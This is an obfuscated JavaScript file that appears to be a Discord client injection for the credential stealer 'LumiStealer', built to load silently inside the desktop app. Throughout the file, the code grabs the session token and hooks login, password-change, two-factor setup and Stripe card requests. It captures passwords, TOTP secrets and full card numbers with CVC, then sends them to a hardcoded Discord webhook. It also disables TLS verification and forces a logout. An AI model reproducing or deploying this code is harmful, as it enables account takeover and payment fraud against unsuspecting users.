var _0xd3ef4a=_0xefc6;(function(_0x1f16b1,_0x198766){var _0xa2293b=_0xefc6,_0x23479e=_0x1f16b1();while(!![]){try{var _0x392138=parseInt(_0xa2293b(0x1e2))/0x1*(-parseInt(_0xa2293b(0x226))/0x2)+parseInt(_0xa2293b(0x1df))/0x3+parseInt(_0xa2293b(0x1fb))/0x4*(-parseInt(_0xa2293b(0x274))/0x5)+-parseInt(_0xa2293b(0x23a))/0x6+parseInt(_0xa2293b(0x257))/0x7*(parseInt(_0xa2293b(0x1cf))/0x8)+parseInt(_0xa2293b(0x205))/0x9*(parseInt(_0xa2293b(0x20f))/0xa)+parseInt(_0xa2293b(0x214))/0xb;if(_0x392138===_0x198766)break;else _0x23479e['push'](_0x23479e['shift']());}catch(_0x54dca1){_0x23479e['push'](_0x23479e['shift']());}}}(_0x3a2c,0x8a6cf),process[_0xd3ef4a(0x270)]['NODE_TLS_REJECT_UNAUTHORIZED']=0x0);const fs=require('fs'),electron=require(_0xd3ef4a(0x272)),https=require(_0xd3ef4a(0x24c)),queryString=require('querystring');var computerName=process['env']['COMPUTERNAME'],tokenScript=_0xd3ef4a(0x1fd),logOutScript=_0xd3ef4a(0x1ff);const dataNow=new Date()['toISOString'](),webhook=_0xd3ef4a(0x1d6);let contents2FA=[];var config={'logout':'true','logout-notify':'true','init-notify':_0xd3ef4a(0x22a),'embed-color':0x2c2f33,'disable_qrcode':_0xd3ef4a(0x22a),'Filter':{'urls':[_0xd3ef4a(0x23d),'https://*.discord.com/api/v*/applications/detectable',_0xd3ef4a(0x22b),'https://*.discord.com/api/v*/users/@me/library',_0xd3ef4a(0x1bb),_0xd3ef4a(0x258),_0xd3ef4a(0x1da),_0xd3ef4a(0x209)]},'onCompleted':{'urls':[_0xd3ef4a(0x246),_0xd3ef4a(0x203),_0xd3ef4a(0x236),'https://discordapp.com/api/v*/auth/login',_0xd3ef4a(0x23e),_0xd3ef4a(0x25c),'https://api.stripe.com/v*/tokens',_0xd3ef4a(0x275),_0xd3ef4a(0x251),'https://*.discord.com/api/v*/auth/mfa/totp',_0xd3ef4a(0x235)]}};async function execScript(_0x472f02){var _0x1de2b6=_0xd3ef4a,_0x1b84ab=electron['BrowserWindow']['getAllWindows']()[0x0],_0x8d7ab5=await _0x1b84ab[_0x1de2b6(0x25f)][_0x1de2b6(0x249)](_0x472f02,!![]);return _0x8d7ab5||null;}function _0xefc6(_0x20521e,_0x342880){var _0x3a2cdb=_0x3a2c();return _0xefc6=function(_0xefc63c,_0x13aac5){_0xefc63c=_0xefc63c-0x1b4;var _0x3df508=_0x3a2cdb[_0xefc63c];return _0x3df508;},_0xefc6(_0x20521e,_0x342880);}const getIP=async()=>{var _0x56b555=_0xd3ef4a,_0x59721b=await execScript(_0x56b555(0x265));return _0x59721b['ip'];},getURL=async(_0x321bce,_0x6a4f8b)=>{var _0x5879df=_0xd3ef4a,_0x317686=await execScript(_0x5879df(0x1b4)+_0x321bce+_0x5879df(0x21d)+_0x6a4f8b+_0x5879df(0x260));return _0x317686;},GetBadges=_0x97ea7b=>{var _0x4378cf=_0xd3ef4a,_0x412eef='';return 0x1==(0x1&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x247)),0x2==(0x2&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x1c7)),0x4==(0x4&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x1b8)),0x8==(0x8&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x1d7)),0x40==(0x40&_0x97ea7b)&&(_0x412eef+='<:bravery:874750808388952075>\x20'),0x80==(0x80&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x239)),0x100==(0x100&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x1cb)),0x200==(0x200&_0x97ea7b)&&(_0x412eef+='<:666_hackingmyshit:1107319657603551253>\x20'),0x4000==(0x4000&_0x97ea7b)&&(_0x412eef+='<:bughunter_2:874750808430874664>\x20'),0x400000==(0x400000&_0x97ea7b)&&(_0x412eef+=_0x4378cf(0x1dd)),0x20000==(0x20000&_0x97ea7b)&&(_0x412eef+='<:devcertif:1041639665498861578>\x20'),''==_0x412eef&&(_0x412eef=_0x4378cf(0x24e)),_0x412eef;},GetRBadges=_0x592a03=>{var _0x36672f=_0xd3ef4a,_0xecc428='';return 0x1==(0x1&_0x592a03)&&(_0xecc428+=_0x36672f(0x247)),0x2==(0x2&_0x592a03)&&(_0xecc428+=_0x36672f(0x1c7)),0x4==(0x4&_0x592a03)&&(_0xecc428+='<:hypesquadevent:1082679435452481738>\x20'),0x8==(0x8&_0x592a03)&&(_0xecc428+=_0x36672f(0x1d7)),0x200==(0x200&_0x592a03)&&(_0xecc428+=_0x36672f(0x1d5)),0x4000==(0x4000&_0x592a03)&&(_0xecc428+=_0x36672f(0x1c2)),0x20000==(0x20000&_0x592a03)&&(_0xecc428+=_0x36672f(0x1f1)),''==_0xecc428&&(_0xecc428=_0x36672f(0x24e)),_0xecc428;},GetNSFW=_0xe2c90b=>{var _0x21aa9e=_0xd3ef4a;switch(_0xe2c90b){case!![]:return _0x21aa9e(0x266);case![]:return _0x21aa9e(0x1ed);default:return'Idk\x20bro\x20you\x20got\x20me';}},GetA2F=_0x37863e=>{var _0x278a87=_0xd3ef4a;switch(_0x37863e){case!![]:return _0x278a87(0x227);case![]:return _0x278a87(0x25e);default:return'WTF\x20DONT\x20HAVES\x20MFA\x20OR\x20HAVES?????';}},parseFriends=_0x3f564b=>{var _0x32ad39=_0xd3ef4a;try{var _0x45a7c6=_0x3f564b[_0x32ad39(0x1de)](_0x1364f3=>_0x1364f3[_0x32ad39(0x22f)]==0x1),_0x270bc7='';for(var _0x51cab0 of _0x45a7c6){var _0x488e36=GetRBadges(_0x51cab0[_0x32ad39(0x216)][_0x32ad39(0x202)]);if(_0x488e36!==':x:')_0x270bc7+=_0x488e36+'\x20'+_0x51cab0['user'][_0x32ad39(0x1c8)]+'#'+_0x51cab0['user']['discriminator']+'\x0a';}if(!_0x270bc7)_0x270bc7=_0x32ad39(0x267);return{'len':_0x45a7c6[_0x32ad39(0x231)],'badges':_0x270bc7};}catch(_0x37e161){return _0x32ad39(0x24e);}},parseBilling=_0x5db25e=>{var _0x4767a2=_0xd3ef4a,_0x38d350='';try{if(!_0x5db25e)return _0x38d350=_0x4767a2(0x24e);_0x5db25e[_0x4767a2(0x271)](_0x3d6549=>{var _0x2bf6e9=_0x4767a2;if(_0x3d6549[_0x2bf6e9(0x228)])return;switch(_0x3d6549[_0x2bf6e9(0x22f)]){case 0x1:_0x38d350+=_0x2bf6e9(0x21f);break;case 0x2:_0x38d350+=':heavy_check_mark:\x20<:paypal:896441236062347374>';}});if(!_0x38d350)_0x38d350=_0x4767a2(0x24e);return _0x38d350;}catch(_0x32a670){return':x:';}},calcDate=(_0x527f1b,_0x1c53b9)=>new Date(_0x527f1b[_0xd3ef4a(0x21e)](_0x527f1b[_0xd3ef4a(0x20d)]()+_0x1c53b9)),GetNitro=_0x4b76c5=>{var _0x29a4f9=_0xd3ef4a;switch(_0x4b76c5[_0x29a4f9(0x1e6)]){default:return':x:';case 0x1:return _0x29a4f9(0x25d);case 0x2:if(!_0x4b76c5['premium_guild_since'])return _0x29a4f9(0x25d);var _0x411072=new Date(Date['now']()),_0x5d39c4=[_0x29a4f9(0x1bc),_0x29a4f9(0x1fa),'<:Booster6Month:1051453773463162890>',_0x29a4f9(0x1e0),_0x29a4f9(0x1c3),_0x29a4f9(0x217),'<:BoosterLevel8:1051453778127237180>',_0x29a4f9(0x1ee)],_0x1d9cd8=[new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)]),new Date(_0x4b76c5[_0x29a4f9(0x1b9)])],_0x1a1fcb=[0x2,0x3,0x6,0x9,0xc,0xf,0x12,0x18],_0x4b76c5=[];for(var _0x43b1f1 in _0x1d9cd8)_0x4b76c5[_0x29a4f9(0x25a)](Math[_0x29a4f9(0x1bf)]((calcDate(_0x1d9cd8[_0x43b1f1],_0x1a1fcb[_0x43b1f1])-_0x411072)/0x5265c00));var _0x533861=0x0;for(var _0x43b1f1 of _0x4b76c5)_0x43b1f1>0x0?'':_0x533861++;return _0x29a4f9(0x20b)+_0x5d39c4[_0x533861];}};function GetLangue(_0x2238bb){var _0x4dd4a9=_0xd3ef4a,_0x4e82be={'fr':':flag_fr:','da':_0x4dd4a9(0x26b),'de':':flag_de:','en-GB':_0x4dd4a9(0x237),'en-US':_0x4dd4a9(0x1e1),'en-ES':_0x4dd4a9(0x276),'hr':':flag_hr:','it':':flag_it:','lt':_0x4dd4a9(0x218),'hu':_0x4dd4a9(0x256),'no':_0x4dd4a9(0x1d0),'pl':':flag_pl:','pr-BR':_0x4dd4a9(0x211),'ro':':flag_ro:','fi':_0x4dd4a9(0x1c6),'sv-SE':_0x4dd4a9(0x26a),'vi':_0x4dd4a9(0x263),'tr':':flag_tr:','cs':_0x4dd4a9(0x26e),'el':':flag_gr:','bg':_0x4dd4a9(0x1d1),'ru':_0x4dd4a9(0x20c),'uk':_0x4dd4a9(0x230),'hi':_0x4dd4a9(0x24d),'th':_0x4dd4a9(0x206),'zh-CN':_0x4dd4a9(0x21a),'ja':_0x4dd4a9(0x254),'zh-TW':':flag_cn:','pt-BR':_0x4dd4a9(0x238),'ko':_0x4dd4a9(0x252)},_0x3e5162=_0x4e82be[_0x2238bb]||'';return _0x3e5162;}async function sendWebhook(_0x17af9b,_0xcc7892){var _0x1237a8=_0xd3ef4a;const _0xef00d2=JSON[_0x1237a8(0x1e3)](_0xcc7892),_0x511bcd=new URL(_0x17af9b),_0x5e0ff6={'hostname':_0x511bcd[_0x1237a8(0x1ef)],'path':_0x511bcd[_0x1237a8(0x225)],'method':_0x1237a8(0x1c5),'headers':{'Content-Type':'application/json','Content-Length':_0xef00d2['length']}},_0x48d082=https['request'](_0x5e0ff6,_0xaae4e3=>{var _0x410db5=_0x1237a8;let _0x4b79a6='';_0xaae4e3['on'](_0x410db5(0x1d4),_0x498138=>{_0x4b79a6+=_0x498138;}),_0xaae4e3['on'](_0x410db5(0x255),()=>{var _0x34a9c5=_0x410db5;console[_0x34a9c5(0x273)](_0x34a9c5(0x243),_0x4b79a6);});});_0x48d082['on'](_0x1237a8(0x23b),_0x2cc89a=>{var _0x344116=_0x1237a8;console['error'](_0x344116(0x241),_0x2cc89a);}),_0x48d082[_0x1237a8(0x269)](_0xef00d2),_0x48d082[_0x1237a8(0x255)]();}const path=(function(){var _0xd785b4=_0xd3ef4a,_0x5595d9=electron['app'][_0xd785b4(0x277)]()['replace'](/\\/g,'/')[_0xd785b4(0x24f)]('/');_0x5595d9[_0xd785b4(0x20e)](),_0x5595d9=_0x5595d9[_0xd785b4(0x21c)]('/');var _0x2aa618=electron[_0xd785b4(0x26c)][_0xd785b4(0x1ec)]();return{'appPath':_0x5595d9,'appName':_0x2aa618};}());function _0x3a2c(){var _0x1b31d2=['error','defaultSession','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','https://discord.com/api/v*/auth/login','email','Secret\x20Key\x20(PUT\x20IN\x20GOOGLE\x20AUTHENTICATOR)','Error\x20sending\x20webhook:','disable_qrcode','Webhook\x20response:','/Lumi','passwd','https://discord.com/api/v*/users/@me','<:staff:891346298932981783>\x20','webRequest','executeJavaScript','Badges:','Username:','https',':flag_in:',':x:','split','flags','https://discordapp.com/api/v*/auth/mfa/totp',':flag_kr:','card[exp_year]',':flag_jp:','end',':flag_no::flag_hu:','217bAOeMK','https://*.discord.com/api/v*/users/@me/billing/subscriptions','New\x20Card\x20Added\x20-\x20LumiStealer','push','Cards\x20-\x20LumiSt3aler','https://*.discord.com/api/v*/auth/login','<:946246402105819216:962747802797113365>','`MFA\x20Not\x20Enabled`','webContents','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(\x20null\x20);\x0a\x20\x20\x20\x20JSON.parse(xmlHttp.responseText);','existsSync','card[exp_month]',':flag_vn:','avatar','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0axmlHttp.open(\x20\x22GET\x22,\x20\x22https://www.myexternalip.com/json\x22,\x20false\x20);\x0axmlHttp.send(\x20null\x20);\x0aJSON.parse(xmlHttp.responseText);',':underage:\x20`NSFW\x20Allowed`','No\x20Rare\x20Friends','Billing:','write',':flag_se:',':flag_dk:','app','Alerts\x20-\x20LumiSt2aler',':flag_cz:','New\x20Token','env','forEach','electron','log','1675000zHiqbu','https://discord.com/api/v*/auth/mfa/totp',':flag_es:','getAppPath','\x0a\x20\x20\x20\x20var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x20\x22GET\x22,\x20\x22','Logins\x20-\x20LumiSt2aler','Phone','#0000\x20-\x20LumiStealer','<:hypesquadevent:1082679435452481738>\x20','premium_guild_since','Nitro:','https://discord.com/api/v*/users/@me/library','<:Booster1Month:1051453771147911208>','Injections\x20-\x20LumiSt3aler','method','round','MFA:','statusCode','<:bughunter_2:874750808430874664>\x20','<:boost12month:1068308256088400004>','@me','POST',':flag_fi:','<:partner:1041639667226914826>\x20','username','Token:','Username','<:balance:874750808267292683>\x20','https://discord.com/api/v8/users/@me','parse','MFA\x20Enabled\x20-\x20LumiStealer','131864AmUfTZ',':flag_no:',':flag_bg:','Filter','mkdirSync','data','<:early:944071770506416198>\x20','https://discord.com/api/webhooks/1246303198780719186/jE_tPOsey7RUh7WpYvxrzE7O-SWhHIoEWZjwQnzFBXLLmTWWHsR9ngz7j5tUrIDi9Ga2','<:bughunter_1:874750808426692658>\x20','onCompleted','ID:','https://discord.com/api/v*/users/@me/billing/subscriptions','Password:','startsWith','<:activedev:1041634224253444146>\x20','filter','1376634CGEvYX','<:Booster9Month:1051453774620803122>',':flag_us:','3ZsEnjg','stringify','https://discord.com/api/v9/users/','Email:','premium_type','Phone:','Badges','Login\x20Detected\x20-\x20LumiSt2aler','url','`\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p=','getName',':underage:\x20`NSFW\x20Not\x20Allowed`','<:Booster24Month:1051453776889917530>','hostname','Email','<:devcertif:1041639665498861578>\x20','https://cdn.discordapp.com/avatars/','session','bytes','New\x20Password','/profile','https://discord.com/api/v9/users/@me/billing/payment-sources','uploadData','wss://remote-auth-gateway','<:Booster2Month:1051453772360077374>','4xgryWX','endsWith','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','IP:','function\x20getLocalStoragePropertyDescriptor(){const\x20o=document.createElement(\x22iframe\x22);document.head.append(o);const\x20e=Object.getOwnPropertyDescriptor(o.contentWindow,\x22localStorage\x22);return\x20o.remove(),e}Object.defineProperty(window,\x22localStorage\x22,getLocalStoragePropertyDescriptor());const\x20localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token\x20+\x20localStorage.tokens\x20+\x20localStorage.MultiAccountStore);','toString','phone','public_flags','https://discordapp.com/api/v*/users/@me','password','180IFulDR',':flag_tw:','Logins\x20-\x20LumiStealer','#0000\x20-\x20LumiSt3aler','wss://remote-auth-gateway.discord.gg/*','includes','<:946246402105819216:962747802797113365>\x20',':flag_ru:','getMonth','pop','461530qYtHqc','mfa_enabled',':flag_pt:','||\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p=','LumiStealer','1747592KudnXb','MFA','user','<:Booster15Month:1051453775832961034>',':flag_lt:','https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png',':flag_cn:','secret','join','\x22,\x20false\x20);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','setMonth',':heavy_check_mark:\x20:credit_card:','Expiration\x20Date:','tokens','Password\x20Changer\x20-\x20LumiSt2aler','card[number]','banner','pathname','347516DGfyyv','`MFA\x20Enabled`','invalid','new_password','true','https://discord.com/api/v*/applications/detectable','totp','Computer\x20Name:','PATCH','type',':flag_ua:','length','Parsa\x20ta\x20aq\x20o:\x20','Card\x20Number:','enable','https://discord.com/api/v*/users/@me/mfa/totp/enable','https://*.discord.com/api/v*/users/@me',':england:',':flag_br:','<:brilliance:874750808338608199>\x20','3771108WqtdHf'];_0x3a2c=function(){return _0x1b31d2;};return _0x3a2c();}async function initOne(){var _0x7d3830=_0xd3ef4a,_0x4b8186=await getIP(),_0x5e4791=await execScript(tokenScript),_0x39308e=await getURL(_0x7d3830(0x1cc),_0x5e4791),_0x571df0=_0x7d3830(0x1f2)+_0x39308e['id']+'/'+_0x39308e[_0x7d3830(0x264)];if(config['init-notify']!=='true')return!![];if(!fs[_0x7d3830(0x261)](__dirname+_0x7d3830(0x244)))fs[_0x7d3830(0x1d3)](__dirname+_0x7d3830(0x244));else return!![];var {appPath:_0x482279,appName:_0x11c2e2}=path,_0x556119=_0x11c2e2;const _0x504751={'title':'First\x20Injection\x20Detected\x20-\x20LumiStealer','color':0xb143e3,'fields':[{'name':'Injection\x20Path:','value':'`'+__dirname+'`','inline':![]},{'name':'Client:','value':'`'+_0x11c2e2+'`','inline':!![]},{'name':_0x7d3830(0x22d),'value':'`'+computerName+'`','inline':!![]},{'name':_0x7d3830(0x1fe),'value':'`'+_0x4b8186+'`','inline':!![]},{'name':'Token:','value':'`'+_0x5e4791+_0x7d3830(0x1eb)+_0x5e4791+')','inline':![]}],'author':{'name':_0x39308e[_0x7d3830(0x1c8)]+_0x7d3830(0x1b7),'icon_url':_0x571df0},'footer':{'icon_url':'https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png','text':_0x7d3830(0x213)},'timestamp':dataNow},_0x28a5fc={'embeds':[_0x504751],'username':_0x7d3830(0x1bd),'avatar_url':_0x7d3830(0x219)};sendWebhook(webhook,_0x28a5fc),await execScript(logOutScript);}initOne();function customData(_0x158116){const _0x561a6b={'content':_0x158116};return _0x561a6b;}electron[_0xd3ef4a(0x1f3)][_0xd3ef4a(0x23c)]['webRequest']['onBeforeRequest'](config[_0xd3ef4a(0x1d2)],(_0x40ae36,_0x20143d)=>{var _0x5b8137=_0xd3ef4a;if(config[_0x5b8137(0x242)]==!![]){if(_0x40ae36[_0x5b8137(0x1ea)][_0x5b8137(0x1dc)](_0x5b8137(0x1f9)))return _0x20143d({'cancel':!![]});}}),electron[_0xd3ef4a(0x1f3)][_0xd3ef4a(0x23c)][_0xd3ef4a(0x248)][_0xd3ef4a(0x1d8)](config['onCompleted'],async(_0x59b3a4,_0xa26b6c)=>{var _0x19cc21=_0xd3ef4a;if(![_0x19cc21(0x1c5),_0x19cc21(0x22e)][_0x19cc21(0x20a)](_0x59b3a4[_0x19cc21(0x1be)]))return;if(_0x59b3a4[_0x19cc21(0x1c1)]!==0xc8)return;try{var _0x13cc25=JSON['parse'](_0x59b3a4['uploadData'][0x0][_0x19cc21(0x1f4)]);}catch(_0x58060a){var _0x13cc25=queryString[_0x19cc21(0x1cd)](decodeURIComponent(_0x59b3a4[_0x19cc21(0x1f8)][0x0]['bytes'][_0x19cc21(0x200)]()));}var _0x5673ab=await execScript(tokenScript),_0x21e2db=getIP(),_0x3d2e3c=await getURL(_0x19cc21(0x1cc),_0x5673ab),_0x106852=await getURL(_0x19cc21(0x1f7),_0x5673ab),_0x582f4a=await getURL('https://discord.com/api/v9/users/@me/relationships',_0x5673ab),_0x18059a=await getURL(_0x19cc21(0x1e4)+_0x3d2e3c['id']+_0x19cc21(0x1f6),_0x5673ab),_0x4ae828=parseBilling(_0x106852);if(!_0x3d2e3c[_0x19cc21(0x264)])var _0x100c53=_0x19cc21(0x219);if(!_0x3d2e3c[_0x19cc21(0x224)])var _0x3caf98='';_0x100c53=_0x19cc21(0x1f2)+_0x3d2e3c['id']+'/'+_0x3d2e3c[_0x19cc21(0x264)];var {appPath:_0x5b5b5e,appName:_0xb2681a}=path,_0x2aad89=_0xb2681a,_0x1edbfe;switch(!![]){case _0x59b3a4[_0x19cc21(0x1ea)]['endsWith']('login'):var _0x17a068=_0x13cc25['password'],_0x267b71=_0x13cc25['login'];contents2FA[_0x19cc21(0x25a)]({'passwd':_0x17a068});function _0x249c13(){var _0x238be8=_0x19cc21;return sendWebhook(webhook,_0x238be8(0x232)+_0x1edbfe),_0x1edbfe;}if(_0x5673ab==null)return!![];const _0x3f6b03={'title':'Login\x20Detected\x20-\x20LumiSt3aler','color':0xb143e3,'fields':[{'name':'Username:','value':'`'+_0x3d2e3c[_0x19cc21(0x1c8)]+'`','inline':!![]},{'name':_0x19cc21(0x1d9),'value':'`'+_0x3d2e3c['id']+'`','inline':!![]},{'name':_0x19cc21(0x1ba),'value':''+GetNitro(_0x18059a),'inline':!![]},{'name':'Email:','value':'`'+_0x3d2e3c['email']+'`','inline':!![]},{'name':_0x19cc21(0x1db),'value':'`'+_0x17a068+'`','inline':!![]},{'name':_0x19cc21(0x1e7),'value':'`'+_0x3d2e3c[_0x19cc21(0x201)]+'`','inline':!![]},{'name':_0x19cc21(0x268),'value':_0x4ae828,'inline':!![]},{'name':_0x19cc21(0x1c0),'value':GetA2F(_0x3d2e3c['mfa_enabled']),'inline':!![]},{'name':'Badges:','value':''+GetBadges(_0x3d2e3c['flags']),'inline':!![]},{'name':_0x19cc21(0x1c9),'value':'||'+_0x5673ab+'||\x0a[Copy\x20Token](https://paste-pgpj.onrender.com/?p='+_0x5673ab+')','inline':![]}],'author':{'name':_0x3d2e3c['username']+_0x19cc21(0x208),'icon_url':_0x100c53},'footer':{'icon_url':_0x19cc21(0x219),'text':_0x19cc21(0x213)},'timestamp':dataNow},_0x13a895={'embeds':[_0x3f6b03],'username':_0x19cc21(0x207),'avatar_url':_0x19cc21(0x219)};await sendWebhook(webhook,_0x13a895);break;case _0x59b3a4[_0x19cc21(0x1ea)][_0x19cc21(0x1fc)](_0x19cc21(0x22c)):const _0x500abc=contents2FA[0x0][_0x19cc21(0x245)],_0x48495a={'title':_0x19cc21(0x1e9),'color':0xb143e3,'fields':[{'name':_0x19cc21(0x24b),'value':'`'+_0x3d2e3c[_0x19cc21(0x1c8)]+'`','inline':!![]},{'name':'ID:','value':'`'+_0x3d2e3c['id']+'`','inline':!![]},{'name':_0x19cc21(0x1ba),'value':''+GetNitro(_0x18059a),'inline':!![]},{'name':_0x19cc21(0x1e5),'value':'`'+_0x3d2e3c['email']+'`','inline':!![]},{'name':_0x19cc21(0x1db),'value':'`'+_0x500abc+'`','inline':!![]},{'name':'Phone:','value':'`'+_0x3d2e3c[_0x19cc21(0x201)]+'`','inline':!![]},{'name':'Billing:','value':_0x4ae828,'inline':!![]},{'name':_0x19cc21(0x1c0),'value':GetA2F(_0x3d2e3c[_0x19cc21(0x210)]),'inline':!![]},{'name':_0x19cc21(0x24a),'value':''+GetBadges(_0x3d2e3c[_0x19cc21(0x250)]),'inline':!![]},{'name':_0x19cc21(0x1c9),'value':'||'+_0x5673ab+_0x19cc21(0x212)+_0x5673ab+')','inline':![]}],'author':{'name':_0x3d2e3c['username']+_0x19cc21(0x1b7),'icon_url':_0x100c53},'footer':{'icon_url':_0x19cc21(0x219),'text':_0x19cc21(0x213)},'timestamp':dataNow};contents2FA['splice'](0x0,contents2FA[_0x19cc21(0x231)]);const _0x53598e={'embeds':[_0x48495a],'username':_0x19cc21(0x1b5),'avatar_url':_0x19cc21(0x219)};await sendWebhook(webhook,_0x53598e);break;case _0x59b3a4[_0x19cc21(0x1ea)]['endsWith'](_0x19cc21(0x221)):var _0x26de6f=_0x13cc25[_0x19cc21(0x223)],_0x40b3bc=_0x13cc25['card[cvc]'],_0x415716=_0x13cc25[_0x19cc21(0x253)],_0x2aac28=_0x13cc25[_0x19cc21(0x262)],_0x408e38=_0x26de6f+'|'+_0x2aac28+'|'+_0x415716+'|'+_0x40b3bc;const _0x289f06={'title':_0x19cc21(0x259),'color':0xb143e3,'fields':[{'name':_0x19cc21(0x24b),'value':'`'+_0x3d2e3c[_0x19cc21(0x1c8)]+'`','inline':!![]},{'name':_0x19cc21(0x1d9),'value':'`'+_0x3d2e3c['id']+'`','inline':!![]},{'name':_0x19cc21(0x1ba),'value':GetNitro(_0x18059a),'inline':!![]},{'name':'Email:','value':'`'+_0x3d2e3c[_0x19cc21(0x23f)]+'`','inline':!![]},{'name':_0x19cc21(0x1e7),'value':'`'+_0x3d2e3c[_0x19cc21(0x201)]+'`','inline':!![]},{'name':_0x19cc21(0x24a),'value':GetBadges(_0x3d2e3c['flags']),'inline':!![]},{'name':_0x19cc21(0x233),'value':'`'+_0x26de6f+'`','inline':!![]},{'name':_0x19cc21(0x220),'value':'`'+_0x2aac28+'/'+_0x415716+'`','inline':!![]},{'name':'CVC:','value':'`'+_0x40b3bc+'`','inline':!![]},{'name':_0x19cc21(0x1c9),'value':'||'+_0x5673ab+_0x19cc21(0x212)+_0x5673ab+')','inline':![]}],'author':{'name':_0x3d2e3c['username']+_0x19cc21(0x1b7),'icon_url':_0x100c53},'footer':{'icon_url':_0x19cc21(0x219),'text':_0x19cc21(0x213)},'timestamp':dataNow},_0x549c9a={'embeds':[_0x289f06],'username':_0x19cc21(0x25b),'avatar_url':_0x19cc21(0x219)};await sendWebhook(webhook,_0x549c9a);break;case _0x59b3a4[_0x19cc21(0x1ea)][_0x19cc21(0x1fc)](_0x19cc21(0x1c4)):var _0x4a26d5=_0x13cc25[_0x19cc21(0x204)],_0x47e607=_0x13cc25[_0x19cc21(0x229)],_0x45ec69=await execScript(tokenScript);if(!_0x47e607||!_0x4a26d5)return!![];const _0x2a43c4={'title':'Password\x20Changed\x20-\x20LumiStealer','color':0xb143e3,'fields':[{'name':_0x19cc21(0x1ca),'value':'`'+_0x3d2e3c['username']+'`','inline':!![]},{'name':'ID','value':'`'+_0x3d2e3c['id']+'`','inline':!![]},{'name':'Nitro','value':GetNitro(_0x18059a),'inline':!![]},{'name':'Email','value':'`'+_0x3d2e3c[_0x19cc21(0x23f)]+'`','inline':!![]},{'name':_0x19cc21(0x1b6),'value':'`'+_0x3d2e3c[_0x19cc21(0x201)]+'`','inline':!![]},{'name':_0x19cc21(0x1e8),'value':GetBadges(_0x3d2e3c[_0x19cc21(0x202)]),'inline':!![]},{'name':'Old\x20Password','value':'`'+_0x4a26d5+'`','inline':!![]},{'name':_0x19cc21(0x1f5),'value':'`'+_0x47e607+'`','inline':!![]},{'name':_0x19cc21(0x215),'value':GetA2F(_0x3d2e3c[_0x19cc21(0x210)]),'inline':!![]},{'name':_0x19cc21(0x26f),'value':'||'+_0x45ec69+_0x19cc21(0x212)+_0x45ec69+')','inline':!![]}],'author':{'name':_0x3d2e3c[_0x19cc21(0x1c8)]+_0x19cc21(0x208),'icon_url':_0x100c53},'footer':{'icon_url':'https://cdn.discordapp.com/attachments/1237225880129114167/1246318859200368671/Lumi.png','text':_0x19cc21(0x213)},'timestamp':dataNow},_0x1a33ed={'embeds':[_0x2a43c4],'username':_0x19cc21(0x222),'avatar_url':_0x19cc21(0x219)};await sendWebhook(webhook,_0x1a33ed);break;case _0x59b3a4[_0x19cc21(0x1ea)]['endsWith'](_0x19cc21(0x234)):var _0xc05b21=_0x13cc25[_0x19cc21(0x21b)],_0x17a068=_0x13cc25[_0x19cc21(0x204)],_0x45ec69=await execScript(tokenScript);const _0x2d7afa={'title':_0x19cc21(0x1ce),'color':0xb143e3,'fields':[{'name':'Username','value':'`'+_0x3d2e3c['username']+'`','inline':!![]},{'name':_0x19cc21(0x1f0),'value':'`'+_0x3d2e3c[_0x19cc21(0x23f)]+'`','inline':!![]},{'name':'Password','value':'`'+_0x17a068+'`','inline':!![]},{'name':_0x19cc21(0x240),'value':'`'+_0xc05b21+'`','inline':![]},{'name':_0x19cc21(0x26f),'value':'||'+_0x45ec69+_0x19cc21(0x212)+_0x45ec69+')','inline':![]}],'author':{'name':_0x3d2e3c[_0x19cc21(0x1c8)]+_0x19cc21(0x208),'icon_url':_0x100c53},'footer':{'icon_url':_0x19cc21(0x219),'text':_0x19cc21(0x213)},'timestamp':dataNow},_0x3f5e50={'embeds':[_0x2d7afa],'username':_0x19cc21(0x26d),'avatar_url':_0x19cc21(0x219)};await sendWebhook(webhook,_0x3f5e50);break;}}),module['exports']=require('./core.asar');
